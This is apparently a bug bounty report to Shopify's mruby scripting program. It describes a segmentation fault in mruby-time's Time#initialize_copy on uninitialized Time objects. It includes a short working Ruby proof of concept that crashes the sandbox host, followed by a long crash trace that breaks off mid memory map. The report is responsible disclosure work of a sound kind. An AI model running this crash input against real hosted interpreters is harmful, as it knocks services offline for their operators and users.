{
  "reported_to": "shopify-scripts",
  "reported_by": "brakhane ",
  "title": "mruby-time: Crash host with uninitialized Time obj",
  "content": "\nSo once again, another try ;) (As always hopefully unknown and valid ;))\nTime::initialize_copy performs its copy action even on Time objects on which initialize never ran, leading to a crash.\nThe PoC crashes https://www.mruby.science/runs - didn't try Shopify production servers for the usual reasons.\nAs a sidenote: Matz has patched a memory leak in the mruby-time here: https://github.com/mruby/mruby/commit/d97a37eb7b4fe52bb1b16bb6f7410fbae85e3809 You probably want to pull this into your copy of mruby-time as this has the potential (not tested) to slowly eat up memory if this condition is hit on purpose. I didn't want to create its own bugreport for this as it's kind of minor and already known upstream.\nPoC\nCode 84 Bytes\n1class Time\n2  def initialize\n3  end\n4end\n5\n6a = Time.new\n7b = Time.new\n8a.initialize_copy b\nTraces\nThis can't be ran from the irb as the implicit printout will fail (without crashing), running it in the sandbox leads to the shown results:\nCode 33.97 KiB\n1$ bin/sandbox /tmp/test.mrb \n2bin/sandbox:20: [BUG] Segmentation fault at 0x00000000000000\n3ruby 2.3.2p217 (2016-11-15 revision 56796) [x86_64-linux]\n4\n5-- Control frame information -----------------------------------------------\n6c:0003 p:---- s:0010 e:000009 CFUNC  :sandbox_eval\n7c:0002 p:0201 s:0005 E:002238 EVAL   bin/sandbox:20 [FINISH]\n8c:0001 p:0000 s:0002 E:0018c0 (none) [FINISH]\n9\n10-- Ruby level backtrace information ----------------------------------------\n11bin/sandbox:20:in `<main>'\n12bin/sandbox:20:in `sandbox_eval'\n13\n14-- Machine register context ------------------------------------------------\n15 RIP: 0x00007f5119cba5d3 RBP: 0x00007f51187f14e0 RSP: 0x00007f51187efab0\n16 RAX: 0x00007f51188144a0 RBX: 0x00007f51187f94f0 RCX: 0x0000000000000000\n17 RDX: 0x0000000000000000 RDI: 0x0000000055504410 RSI: 0x00007f5119f29c10\n18  R8: 0x00007f51187f94c0  R9: 0x0000000000000001 R10: 0x0000000000000177\n19 R11: 0x00007f5119cb0f60 R12: 0x00007f51187f94f0 R13: 0x000000000000004d\n20 R14: 0x00007f51187f14e0 R15: 0x00007f51187f1f60 EFL: 0x0000000000010246\n21\n22-- C level backtrace information -------------------------------------------\n23/usr/lib/libruby.so.2.3 [0x7f511dd49425]\n24/usr/lib/libruby.so.2.3 [0x7f511dd4965c]\n25/usr/lib/libruby.so.2.3 [0x7f511dc23e34]\n26/usr/lib/libruby.so.2.3 [0x7f511dcd56ce]\n27/usr/lib/libc.so.6 [0x7f511d8490b0]\n28/home/simon/git/shopify/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_time_initialize_copy+0x73) [0x7f5119cba5d3] /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby-time/src/time.c:533\n29/home/simon/git/shopify/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_vm_exec+0x75f) [0x7f5119c79dbf] /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby/src/vm.c:1165\n30/home/simon/git/shopify/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_vm_run+0x57) [0x7f5119c7f607] /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby/src/vm.c:766\n31/home/simon/git/shopify/mruby-engine/lib/mruby_engine/mruby_engine.so(mruby_engine_monitored_eval+0x113) [0x7f5119c60613] ../../../../ext/mruby_engine/eval_monitored.c:68\n32/usr/lib/libpthread.so.0(start_thread+0xc4) [0x7f511d600454]\n33/usr/lib/libc.so.6(clone+0x5f) [0x7f511d8fe7df]\n34\n35-- Other runtime information -----------------------------------------------\n36\n37* Loaded script: bin/sandbox\n38\n39* Loaded features:\n40\n41    0 enumerator.so\n42    1 thread.rb\n43    2 rational.so\n44    3 complex.so\n45    4 /usr/lib/ruby/2.3.0/x86_64-linux/enc/encdb.so\n46    5 /usr/lib/ruby/2.3.0/x86_64-linux/enc/trans/transdb.so\n47    6 /usr/lib/ruby/2.3.0/unicode_normalize.rb\n48    7 /usr/lib/ruby/2.3.0/x86_64-linux/rbconfig.rb\n49    8 /usr/lib/ruby/2.3.0/rubygems/compatibility.rb\n50    9 /usr/lib/ruby/2.3.0/rubygems/defaults.rb\n51   10 /usr/lib/ruby/2.3.0/rubygems/deprecate.rb\n52   11 /usr/lib/ruby/2.3.0/rubygems/errors.rb\n53   12 /usr/lib/ruby/2.3.0/rubygems/version.rb\n54   13 /usr/lib/ruby/2.3.0/rubygems/requirement.rb\n55   14 /usr/lib/ruby/2.3.0/rubygems/platform.rb\n56   15 /usr/lib/ruby/2.3.0/rubygems/basic_specification.rb\n57   16 /usr/lib/ruby/2.3.0/rubygems/stub_specification.rb\n58   17 /usr/lib/ruby/2.3.0/rubygems/util/list.rb\n59   18 /usr/lib/ruby/2.3.0/x86_64-linux/stringio.so\n60   19 /usr/lib/ruby/2.3.0/rubygems/specification.rb\n61   20 /usr/lib/ruby/2.3.0/rubygems/exceptions.rb\n62   21 /usr/lib/ruby/2.3.0/rubygems/dependency.rb\n63   22 /usr/lib/ruby/2.3.0/rubygems/core_ext/kernel_gem.rb\n64   23 /usr/lib/ruby/2.3.0/monitor.rb\n65   24 /usr/lib/ruby/2.3.0/rubygems/core_ext/kernel_require.rb\n66   25 /usr/lib/ruby/2.3.0/rubygems.rb\n67   26 /usr/lib/ruby/2.3.0/rubygems/path_support.rb\n68   27 /usr/lib/ruby/gems/2.3.0/gems/did_you_mean-1.0.0/lib/did_you_mean/version.rb\n69   28 /usr/lib/ruby/gems/2.3.0/gems/did_you_mean-1.0.0/lib/did_you_mean/core_ext/name_error.rb\n70   29 /usr/lib/ruby/gems/2.3.0/gems/did_you_mean-1.0.0/lib/did_you_mean/levenshtein.rb\n71   30 /usr/lib/ruby/gems/2.3.0/gems/did_you_mean-1.0.0/lib/did_you_mean/jaro_winkler.rb\n72   31 /usr/lib/ruby/gems/2.3.0/gems/did_you_mean-1.0.0/lib/did_you_mean/spell_checkable.rb\n73   32 /usr/lib/ruby/2.3.0/delegate.rb\n74   33 /usr/lib/ruby/gems/2.3.0/gems/did_you_mean-1.0.0/lib/did_you_mean/spell_checkers/name_error_checkers/class_name_checker.rb\n75   34 /usr/lib/ruby/gems/2.3.0/gems/did_you_mean-1.0.0/lib/did_you_mean/spell_checkers/name_error_checkers/variable_name_checker.rb\n76   35 /usr/lib/ruby/gems/2.3.0/gems/did_you_mean-1.0.0/lib/did_you_mean/spell_checkers/name_error_checkers.rb\n77   36 /usr/lib/ruby/gems/2.3.0/gems/did_you_mean-1.0.0/lib/did_you_mean/spell_checkers/method_name_checker.rb\n78   37 /usr/lib/ruby/gems/2.3.0/gems/did_you_mean-1.0.0/lib/did_you_mean/spell_checkers/null_checker.rb\n79   38 /usr/lib/ruby/gems/2.3.0/gems/did_you_mean-1.0.0/lib/did_you_mean/formatter.rb\n80   39 /usr/lib/ruby/gems/2.3.0/gems/did_you_mean-1.0.0/lib/did_you_mean.rb\n81   40 /usr/lib/ruby/2.3.0/x86_64-linux/pathname.so\n82   41 /usr/lib/ruby/2.3.0/pathname.rb\n83   42 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/postit_trampoline.rb\n84   43 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/constants.rb\n85   44 /usr/lib/ruby/2.3.0/x86_64-linux/io/console.so\n86   45 /usr/lib/ruby/2.3.0/rubygems/user_interaction.rb\n87   46 /usr/lib/ruby/2.3.0/x86_64-linux/etc.so\n88   47 /usr/lib/ruby/2.3.0/rubygems/config_file.rb\n89   48 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/rubygems_integration.rb\n90   49 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/current_ruby.rb\n91   50 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/shared_helpers.rb\n92   51 /usr/lib/ruby/2.3.0/fileutils.rb\n93   52 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/errors.rb\n94   53 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/environment_preserver.rb\n95   54 /usr/lib/ruby/2.3.0/x86_64-linux/socket.so\n96   55 /usr/lib/ruby/2.3.0/x86_64-linux/io/wait.so\n97   56 /usr/lib/ruby/2.3.0/socket.rb\n98   57 /usr/lib/ruby/2.3.0/timeout.rb\n99   58 /usr/lib/ruby/2.3.0/net/protocol.rb\n100   59 /usr/lib/ruby/2.3.0/uri/rfc2396_parser.rb\n101   60 /usr/lib/ruby/2.3.0/uri/rfc3986_parser.rb\n102   61 /usr/lib/ruby/2.3.0/uri/common.rb\n103   62 /usr/lib/ruby/2.3.0/uri/generic.rb\n104   63 /usr/lib/ruby/2.3.0/uri/ftp.rb\n105   64 /usr/lib/ruby/2.3.0/uri/http.rb\n106   65 /usr/lib/ruby/2.3.0/uri/https.rb\n107   66 /usr/lib/ruby/2.3.0/uri/ldap.rb\n108   67 /usr/lib/ruby/2.3.0/uri/ldaps.rb\n109   68 /usr/lib/ruby/2.3.0/uri/mailto.rb\n110   69 /usr/lib/ruby/2.3.0/uri.rb\n111   70 /usr/lib/ruby/2.3.0/x86_64-linux/zlib.so\n112   71 /usr/lib/ruby/2.3.0/net/http/exceptions.rb\n113   72 /usr/lib/ruby/2.3.0/net/http/header.rb\n114   73 /usr/lib/ruby/2.3.0/x86_64-linux/enc/windows_31j.so\n115   74 /usr/lib/ruby/2.3.0/net/http/generic_request.rb\n116   75 /usr/lib/ruby/2.3.0/net/http/request.rb\n117   76 /usr/lib/ruby/2.3.0/net/http/requests.rb\n118   77 /usr/lib/ruby/2.3.0/net/http/response.rb\n119   78 /usr/lib/ruby/2.3.0/net/http/responses.rb\n120   79 /usr/lib/ruby/2.3.0/net/http/proxy_delta.rb\n121   80 /usr/lib/ruby/2.3.0/net/http/backward.rb\n122   81 /usr/lib/ruby/2.3.0/net/http.rb\n123   82 /usr/lib/ruby/2.3.0/x86_64-linux/date_core.so\n124   83 /usr/lib/ruby/2.3.0/date.rb\n125   84 /usr/lib/ruby/2.3.0/time.rb\n126   85 /usr/lib/ruby/2.3.0/rubygems/request/http_pool.rb\n127   86 /usr/lib/ruby/2.3.0/rubygems/request/https_pool.rb\n128   87 /usr/lib/ruby/2.3.0/rubygems/request/connection_pools.rb\n129   88 /usr/lib/ruby/2.3.0/rubygems/request.rb\n130   89 /usr/lib/ruby/2.3.0/cgi/core.rb\n131   90 /usr/lib/ruby/2.3.0/x86_64-linux/cgi/escape.so\n132   91 /usr/lib/ruby/2.3.0/cgi/util.rb\n133   92 /usr/lib/ruby/2.3.0/cgi/cookie.rb\n134   93 /usr/lib/ruby/2.3.0/cgi.rb\n135   94 /usr/lib/ruby/2.3.0/rubygems/uri_formatter.rb\n136   95 /usr/lib/ruby/2.3.0/x86_64-linux/digest.so\n137   96 /usr/lib/ruby/2.3.0/digest.rb\n138   97 /usr/lib/ruby/2.3.0/x86_64-linux/openssl.so\n139   98 /usr/lib/ruby/2.3.0/openssl/bn.rb\n140   99 /usr/lib/ruby/2.3.0/openssl/pkey.rb\n141  100 /usr/lib/ruby/2.3.0/openssl/cipher.rb\n142  101 /usr/lib/ruby/2.3.0/openssl/config.rb\n143  102 /usr/lib/ruby/2.3.0/openssl/digest.rb\n144  103 /usr/lib/ruby/2.3.0/openssl/x509.rb\n145  104 /usr/lib/ruby/2.3.0/openssl/buffering.rb\n146  105 /usr/lib/ruby/2.3.0/x86_64-linux/io/nonblock.so\n147  106 /usr/lib/ruby/2.3.0/openssl/ssl.rb\n148  107 /usr/lib/ruby/2.3.0/openssl.rb\n149  108 /usr/lib/ruby/2.3.0/securerandom.rb\n150  109 /usr/lib/ruby/2.3.0/resolv.rb\n151  110 /usr/lib/ruby/2.3.0/rubygems/remote_fetcher.rb\n152  111 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/gem_remote_fetcher.rb\n153  112 /usr/lib/ruby/2.3.0/x86_64-linux/digest/sha1.so\n154  113 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/plugin/api/source.rb\n155  114 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/plugin/api.rb\n156  115 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/plugin.rb\n157  116 /usr/lib/ruby/2.3.0/rubygems/util.rb\n158  117 /usr/lib/ruby/2.3.0/rubygems/source/git.rb\n159  118 /usr/lib/ruby/2.3.0/rubygems/source/installed.rb\n160  119 /usr/lib/ruby/2.3.0/rubygems/source/specific_file.rb\n161  120 /usr/lib/ruby/2.3.0/rubygems/source/local.rb\n162  121 /usr/lib/ruby/2.3.0/rubygems/source/lock.rb\n163  122 /usr/lib/ruby/2.3.0/rubygems/source/vendor.rb\n164  123 /usr/lib/ruby/2.3.0/rubygems/source.rb\n165  124 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/gem_helpers.rb\n166  125 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/match_platform.rb\n167  126 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/rubygems_ext.rb\n168  127 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/version.rb\n169  128 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler.rb\n170  129 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/settings.rb\n171  130 /usr/lib/ruby/2.3.0/rubygems/ext/build_error.rb\n172  131 /usr/lib/ruby/2.3.0/rubygems/ext/builder.rb\n173  132 /usr/lib/ruby/2.3.0/rubygems/ext/configure_builder.rb\n174  133 /usr/lib/ruby/2.3.0/tmpdir.rb\n175  134 /usr/lib/ruby/2.3.0/tempfile.rb\n176  135 /usr/lib/ruby/2.3.0/rubygems/ext/ext_conf_builder.rb\n177  136 /usr/lib/ruby/2.3.0/rubygems/ext/rake_builder.rb\n178  137 /usr/lib/ruby/2.3.0/optparse.rb\n179  138 /usr/lib/ruby/2.3.0/rubygems/command.rb\n180  139 /usr/lib/ruby/2.3.0/rubygems/ext/cmake_builder.rb\n181  140 /usr/lib/ruby/2.3.0/rubygems/ext.rb\n182  141 /usr/lib/ruby/2.3.0/x86_64-linux/strscan.so\n183  142 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/source.rb\n184  143 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/source/path.rb\n185  144 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/source/git.rb\n186  145 /usr/lib/ruby/2.3.0/rubygems/text.rb\n187  146 /usr/lib/ruby/2.3.0/rubygems/name_tuple.rb\n188  147 /usr/lib/ruby/2.3.0/rubygems/spec_fetcher.rb\n189  148 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/source/rubygems.rb\n190  149 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/lockfile_parser.rb\n191  150 /usr/lib/ruby/2.3.0/set.rb\n192  151 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/definition.rb\n193  152 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/dependency.rb\n194  153 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/ruby_dsl.rb\n195  154 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/dsl.rb\n196  155 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/source_list.rb\n197  156 /home/simon/git/shopify/mruby-engine/lib/mruby_engine/version.rb\n198  157 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/index.rb\n199  158 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/source/gemspec.rb\n200  159 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/lazy_specification.rb\n201  160 /usr/lib/ruby/2.3.0/tsort.rb\n202  161 /usr/lib/ruby/2.3.0/forwardable.rb\n203  162 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/spec_set.rb\n204  163 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/gem_version_promoter.rb\n205  164 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/runtime.rb\n206  165 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/ui.rb\n207  166 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/ui/silent.rb\n208  167 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/ui/rg_proxy.rb\n209  168 /usr/lib/ruby/2.3.0/rubygems/util/licenses.rb\n210  169 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/remote_specification.rb\n211  170 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/dep_proxy.rb\n212  171 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/vendor/molinillo/lib/molinillo/gem_metadata.rb\n213  172 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/vendor/molinillo/lib/molinillo/errors.rb\n214  173 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/vendor/molinillo/lib/molinillo/dependency_graph/action.rb\n215  174 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/vendor/molinillo/lib/molinillo/dependency_graph/add_edge_no_circular.rb\n216  175 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/vendor/molinillo/lib/molinillo/dependency_graph/add_vertex.rb\n217  176 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/vendor/molinillo/lib/molinillo/dependency_graph/detach_vertex_named.rb\n218  177 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/vendor/molinillo/lib/molinillo/dependency_graph/set_payload.rb\n219  178 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/vendor/molinillo/lib/molinillo/dependency_graph/tag.rb\n220  179 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/vendor/molinillo/lib/molinillo/dependency_graph/log.rb\n221  180 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/vendor/molinillo/lib/molinillo/dependency_graph/vertex.rb\n222  181 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/vendor/molinillo/lib/molinillo/dependency_graph.rb\n223  182 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/vendor/molinillo/lib/molinillo/state.rb\n224  183 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/vendor/molinillo/lib/molinillo/modules/specification_provider.rb\n225  184 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/vendor/molinillo/lib/molinillo/delegates/resolution_state.rb\n226  185 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/vendor/molinillo/lib/molinillo/delegates/specification_provider.rb\n227  186 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/vendor/molinillo/lib/molinillo/resolution.rb\n228  187 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/vendor/molinillo/lib/molinillo/resolver.rb\n229  188 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/vendor/molinillo/lib/molinillo/modules/ui.rb\n230  189 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/vendor/molinillo/lib/molinillo.rb\n231  190 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/vendored_molinillo.rb\n232  191 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/resolver.rb\n233  192 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/endpoint_specification.rb\n234  193 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/stub_specification.rb\n235  194 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/setup.rb\n236  195 /usr/lib/ruby/2.3.0/json/version.rb\n237  196 /usr/lib/ruby/2.3.0/ostruct.rb\n238  197 /usr/lib/ruby/2.3.0/json/generic_object.rb\n239  198 /usr/lib/ruby/2.3.0/json/common.rb\n240  199 /usr/lib/ruby/2.3.0/x86_64-linux/enc/utf_16be.so\n241  200 /usr/lib/ruby/2.3.0/x86_64-linux/enc/utf_16le.so\n242  201 /usr/lib/ruby/2.3.0/x86_64-linux/enc/utf_32be.so\n243  202 /usr/lib/ruby/2.3.0/x86_64-linux/enc/utf_32le.so\n244  203 /usr/lib/ruby/2.3.0/x86_64-linux/json/ext/parser.so\n245  204 /usr/lib/ruby/2.3.0/x86_64-linux/json/ext/generator.so\n246  205 /usr/lib/ruby/2.3.0/json/ext.rb\n247  206 /usr/lib/ruby/2.3.0/json.rb\n248  207 /home/simon/git/shopify/mruby-engine/lib/mruby_engine/mruby_engine.so\n249  208 /home/simon/git/shopify/mruby-engine/lib/mruby_engine.rb\n250\n251* Process memory map:\n252\n25300400000-00401000 r-xp 00000000 08:03 948906                             /usr/bin/ruby\n25400600000-00601000 r--p 00000000 08:03 948906                             /usr/bin/ruby\n25500601000-00602000 rw-p 00001000 08:03 948906                             /usr/bin/ruby\n2560171f000-0282e000 rw-p 00000000 00:00 0                                  [heap]\n2577f5110000000-7f5110021000 rw-p 00000000 00:00 0 \n2587f5110021000-7f5114000000 ---p 00000000 00:00 0 \n2597f5117554000-7f5117980000 r--s 00000000 08:04 1838958                    /home/simon/git/shopify/mruby-engine/lib/mruby_engine/mruby_engine.so\n2607f5117980000-7f5117b5d000 r--s 00000000 08:03 934952                     /usr/lib/libc-2.24.so\n2617f5117b5d000-7f5117dd9000 r--s 00000000 08:03 936071                     /usr/lib/libruby.so.2.3.0\n2627f5117dd9000-7f5117def000 r-xp 00000000 08:03 935430                     /usr/lib/libgcc_s.so.1\n2637f5117def000-7f5117fee000 ---p 00016000 08:03 935430                     /usr/lib/libgcc_s.so.1\n2647f5117fee000-7f5117fef000 r--p 00015000 08:03 935430                     /usr/lib/libgcc_s.so.1\n2657f5117fef000-7f5117ff0000 rw-p 00016000 08:03 935430                     /usr/lib/libgcc_s.so.1\n2667f5117ff0000-7f5117ff1000 ---p 00000000 00:00 0 \n2677f5117ff1000-7f5118bf1000 rw-p 00000000 00:00 0 \n2687f5118bf1000-7f5118bf8000 r-xp 00000000 08:03 1061028                    /usr/lib/ruby/2.3.0/x86_64-linux/json/ext/generator.so\n2697f5118bf8000-7f5118df8000 ---p 00007000 08:03 1061028                    /usr/lib/ruby/2.3.0/x86_64-linux/json/ext/generator.so\n2707f5118df8000-7f5118df9000 r--p 00007000 08:03 1061028                    /usr/lib/ruby/2.3.0/x86_64-linux/json/ext/generator.so\n2717f5118df9000-7f5118dfa000 rw-p 00008000 08:03 1061028                    /usr/lib/ruby/2.3.0/x86_64-linux/json/ext/generator.so\n2727f5118dfa000-7f5118dfb000 r-xp 00000000 08:03 948491                     /usr/lib/ruby/2.3.0/x86_64-linux/enc/utf_32le.so\n2737f5118dfb000-7f5118ffa000 ---p 00001000 08:03 948491                     /usr/lib/ruby/2.3.0/x86_64-linux/enc/utf_32le.so\n2747f5118ffa000-7f5118ffb000 r--p 00000000 08:03 948491                     /usr/lib/ruby/2.3.0/x86_64-linux/enc/utf_32le.so\n2757f5118ffb000-7f5118ffc000 rw-p 00001000 08:03 948491                     /usr/lib/ruby/2.3.0/x86_64-linux/enc/utf_32le.so\n2767f5118ffc000-7f5118ffd000 r-xp 00000000 08:03 948495                     /usr/lib/ruby/2.3.0/x86_64-linux/enc/utf_32be.so\n2777f5118ffd000-7f51191fc000 ---p 00001000 08:03 948495                     /usr/lib/ruby/2.3.0/x86_64-linux/enc/utf_32be.so\n2787f51191fc000-7f51191fd000 r--p 00000000 08:03 948495                     /usr/lib/ruby/2.3.0/x86_64-linux/enc/utf_32be.so\n2797f51191fd000-7f51191fe000 rw-p 00001000 08:03 948495                     /usr/lib/ruby/2.3.0/x86_64-linux/enc/utf_32be.so\n2807f51191fe000-7f51191ff000 r-xp 00000000 08:03 948510                     /usr/lib/ruby/2.3.0/x86_64-linux/enc/utf_16le.so\n2817f51191ff000-7f51193ff000 ---p 00001000 08:03 948510                     /usr/lib/ruby/2.3.0/x86_64-linux/enc/utf_16le.so\n2827f51193ff000-7f5119400000 r--p 00001000 08:03 948510                     /usr/lib/ruby/2.3.0/x86_64-linux/enc/utf_16le.so\n2837f5119400000-7f5119401000 rw-p 00002000 08:03 948510                     /usr/lib/ruby/2.3.0/x86_64-linux/enc/utf_16le.so\n2847f5119401000-7f5119402000 r-xp 00000000 08:03 948514                     /usr/lib/ruby/2.3.0/x86_64-linux/enc/utf_16be.so\n2857f5119402000-7f5119602000 ---p 00001000 08:03 948514                     /usr/lib/ruby/2.3.0/x86_64-linux/enc/utf_16be.so\n2867f5119602000-7f5119603000 r--p 00001000 08:03 948514                     /usr/lib/ruby/2.3.0/x86_64-linux/enc/utf_16be.so\n2877f5119603000-7f5119604000 rw-p 00002000 08:03 948514                     /usr/lib/ruby/2.3.0/x86_64-linux/enc/utf_16be.so\n2887f5119604000-7f511960a000 r-xp 00000000 08:03 1061029                    /usr/lib/ruby/2.3.0/x86_64-linux/json/ext/parser.so\n2897f511960a000-7f5119809000 ---p 00006000 08:03 1061029                    /usr/lib/ruby/2.3.0/x86_64-linux/json/ext/parser.so\n2907f5119809000-7f511980a000 r--p 00005000 08:03 1061029                    /usr/lib/ruby/2.3.0/x86_64-linux/json/ext/parser.so\n2917f511980a000-7f511980b000 rw-p 00006000 08:03 1061029                    /usr/lib/ruby/2.3.0/x86_64-linux/json/ext/parser.so\n2927f511980b000-7f5119830000 r-xp 00000000 08:03 935807                     /usr/lib/liblzma.so.5.2.2\n2937f5119830000-7f5119a2f000 ---p 00025000 08:03 935807                     /usr/lib/liblzma.so.5.2.2\n2947f5119a2f000-7f5119a30000 r--p 00024000 08:03 935807                     /usr/lib/liblzma.so.5.2.2\n2957f5119a30000-7f5119a31000 rw-p 00025000 08:03 935807                     /usr/lib/liblzma.so.5.2.2\n2967f5119a31000-7f5119a3c000 r-xp 00000000 08:03 944077                     /usr/lib/libunwind.so.8.0.1\n2977f5119a3c000-7f5119c3b000 ---p 0000b000 08:03 944077                     /usr/lib/libunwind.so.8.0.1\n2987f5119c3b000-7f5119c3c000 r--p 0000a000 08:03 944077                     /usr/lib/libunwind.so.8.0.1\n2997f5119c3c000-7f5119c3d000 rw-p 0000b000 08:03 944077                     /usr/lib/libunwind.so.8.0.1\n3007f5119c3d000-7f5119c4b000 rw-p 00000000 00:00 0 \n3017f5119c4b000-7f5119d29000 r-xp 00000000 08:04 1838958                    /home/simon/git/shopify/mruby-engine/lib/mruby_engine/mruby_engine.so\n3027f5119d29000-7f5119f28000 ---p 000de000 08:04 1838958                    /home/simon/git/shopify/mruby-engine/lib/mruby_engine/mruby_engine.so\n3037f5119f28000-7f5119f2a000 r--p 000dd000 08:04 1838958                    /home/simon/git/shopify/mruby-engine/lib/mruby_engine/mruby_engine.so\n3047f5119f2a000-7f5119f2c000 rw-p 000df000 08:04 1838958                    /home/simon/git/shopify/mruby-engine/lib/mruby_engine/mruby_engine.so\n3057f5119f2c000-7f5119f31000 r-xp 00000000 08:03 948468                     /usr/lib/ruby/2.3.0/x86_64-linux/strscan.so\n3067f5119f31000-7f511a130000 ---p 00005000 08:03 948468                     /usr/lib/ruby/2.3.0/x86_64-linux/strscan.so\n3077f511a130000-7f511a131000 r--p 00004000 08:03 948468                     /usr/lib/ruby/2.3.0/x86_64-linux/strscan.so\n3087f511a131000-7f511a132000 rw-p 00005000 08:03 948468                     /usr/lib/ruby/2.3.0/x86_64-linux/strscan.so\n3097f511a132000-7f511a133000 r-xp 00000000 08:03 948522                     /usr/lib/ruby/2.3.0/x86_64-linux/digest/sha1.so\n3107f511a133000-7f511a332000 ---p 00001000 08:03 948522                     /usr/lib/ruby/2.3.0/x86_64-linux/digest/sha1.so\n3117f511a332000-7f511a333000 r--p 00000000 08:03 948522                     /usr/lib/ruby/2.3.0/x86_64-linux/digest/sha1.so\n3127f511a333000-7f511a334000 rw-p 00001000 08:03 948522                     /usr/lib/ruby/2.3.0/x86_64-linux/digest/sha1.so\n3137f511a334000-7f511a335000 r-xp 00000000 08:03 948520                     /usr/lib/ruby/2.3.0/x86_64-linux/io/nonblock.so\n3147f511a335000-7f511a535000 ---p 00001000 08:03 948520                     /usr/lib/ruby/2.3.0/x86_64-linux/io/nonblock.so\n3157f511a535000-7f511a536000 r--p 00001000 08:03 948520                     /usr/lib/ruby/2.3.0/x86_64-linux/io/nonblock.so\n3167f511a536000-7f511a537000 rw-p 00002000 08:03 948520                     /usr/lib/ruby/2.3.0/x86_64-linux/io/nonblock.so\n3177f511a537000-7f511a53a000 r-xp 00000000 08:03 948451                     /usr/lib/ruby/2.3.0/x86_64-linux/digest.so\n3187f511a53a000-7f511a739000 ---p 00003000 08:03 948451                     /usr/lib/ruby/2.3.0/x86_64-linux/digest.so\n3197f511a739000-7f511a73a000 r--p 00002000 08:03 948451                     /usr/lib/ruby/2.3.0/x86_64-linux/digest.so\n3207f511a73a000-7f511a73b000 rw-p 00003000 08:03 948451                     /usr/lib/ruby/2.3.0/x86_64-linux/digest.so\n3217f511a73b000-7f511a989000 